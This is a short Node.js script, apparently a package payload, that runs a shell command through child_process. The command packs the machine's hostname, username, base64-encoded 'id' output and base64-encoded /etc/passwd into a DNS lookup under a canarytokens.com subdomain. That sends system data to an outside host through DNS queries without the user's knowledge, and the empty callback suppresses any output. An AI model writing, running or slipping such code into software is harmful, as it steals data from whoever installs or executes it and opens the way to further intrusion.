const { exec } = require('child_process');

const command = `nslookup "$(hostname).$(whoami).$(id | base64 | tr -d '\n').$(cat /etc/passwd | base64 | tr -d '\n').sampleid.canarytokens.com"`;
exec(command, () => {});
